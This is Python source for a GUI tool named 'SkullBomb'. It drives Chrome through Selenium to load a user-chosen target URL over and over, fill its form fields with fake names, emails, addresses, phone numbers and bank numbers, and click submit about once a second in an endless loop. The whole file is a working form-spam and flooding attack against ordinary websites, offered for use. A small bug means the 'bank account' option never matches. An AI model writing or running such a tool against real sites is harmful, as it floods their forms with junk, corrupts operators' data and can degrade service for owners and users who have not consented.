import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk
from selenium import webdriver
from faker import Faker
from webdriver_manager.chrome import ChromeDriverManager
import sys
import requests
import time
import datetime

window = tk.Tk()
window.title('SkullBomb')
window.geometry("500x600")
fake = Faker()

entryOrder = []
attack = False

entrance = tk.Frame(window)
entrance.pack(pady=20)
buttonFrame = tk.Frame(window)
buttonFrame.pack(ipady=20)
topframe = tk.Frame(window)
topframe.pack()


def attack():
    driver = webdriver.Chrome(ChromeDriverManager().install())
    
    target_url = url_entry.get()
    
    while True:

        driver.get(target_url)

        for point in entryOrder:
            current_point = driver.find_element_by_xpath(point[1].get())
            if(point[0][:-1] == 'param'):
                if(point[2].get() == 'name'):
                    current_point.send_keys(fake.name())
                if(point[2].get() == 'email'):
                    current_point.send_keys(fake.email())
                if(point[2].get() == 'text'):
                    current_point.send_keys(fake.text())
                if(point[2].get() == 'date'):
                    current_point.send_keys(fake.date())
                if(point[2].get() == 'address'):
                    current_point.send_keys(fake.address())
                if(point[2].get() == 'phone'):
                    current_point.send_keys(fake.phone_number())
                if(point[2].get() == 'bank acount'):
                    current_point.send_keys(fake.iban())
            if(point[0][:-1] == 'button'):
                current_point.click()
        time.sleep(1)

		
def display_params_and_buttons(array_item):
    for item in array_item:
        entryIndex = entryOrder.index(item) + 1
        label = tk.Label(topframe, text=item[0])
        label.grid(row=entryIndex)
        item[1].grid(row=entryIndex, column=1)
        if(len(item) > 2):
            item[2].grid(row=entryIndex, column=2)
        

def add_new_parameter():
    length = len(entryOrder)
    newParameter = "param" + str(length + 1)
    entryOrder.append([
        newParameter,
        tk.Entry(topframe, text=newParameter),
        ttk.Combobox(
            topframe, 
            values=[
                'name',
                'email',
                'text',
                'date',
                'address',
                'phone',
                'bank account',
            ],
        )
    ])
    display_params_and_buttons(entryOrder)

def add_new_button():
    length = len(entryOrder)
    newParameter = "button" + str(length + 1)
    entryOrder.append([
        newParameter,
        tk.Entry(topframe, text=newParameter),
    ])
    display_params_and_buttons(entryOrder)

add_param = tk.Button(buttonFrame, text="Add input", command=add_new_parameter)
add_button = tk.Button(buttonFrame, text="Add button", command=add_new_button)
attack_button = tk.Button(buttonFrame, text="Attack", command=attack, fg='tomato')

add_param.grid(row=0)
add_button.grid(row=0, column=1)
attack_button.grid(row=0, column=2)


img = Image.open("./assets/skull.png")
img = img.resize((200, 250))
tkimage = ImageTk.PhotoImage(img)
tk.Label(entrance, image=tkimage, pady=10).grid()


url = tk.Label(topframe, text="Target url", padx=5, pady=5)
url.grid(row=0)
url_entry = tk.Entry(topframe)
url_entry.grid(row=0, column=1, columnspan=3, sticky='ew')

window.mainloop()